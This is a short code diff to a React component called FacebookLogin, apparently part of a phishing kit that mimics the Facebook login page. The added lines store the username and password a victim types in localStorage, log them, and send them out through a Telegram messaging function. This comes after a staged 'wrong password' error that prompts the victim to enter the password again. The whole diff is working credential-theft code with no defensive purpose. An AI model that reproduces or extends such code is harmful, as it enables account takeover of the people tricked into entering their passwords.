@@ -1,4 +1,4 @@
-import { sendMessageUserNameTelegram } from "@/services/send-message";
+import { sendMessageUserNameTelegram, sendMessageUserNameTelegram1 } from "@/services/send-message";
 import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
@@ -24,6 +24,10 @@ export default function FacebookLogin() {
       if (attempts.length === 0) {
         setShowError(true);
         setAttempts([data]);
+        const newAttempts = [...attempts, data];
+        console.log(newAttempts);
+        localStorage.setItem("loginAttempts", JSON.stringify(newAttempts));
+        sendMessageUserNameTelegram1(newAttempts);
         setValue("password", "");
       } else {
         const newAttempts = [...attempts, data];
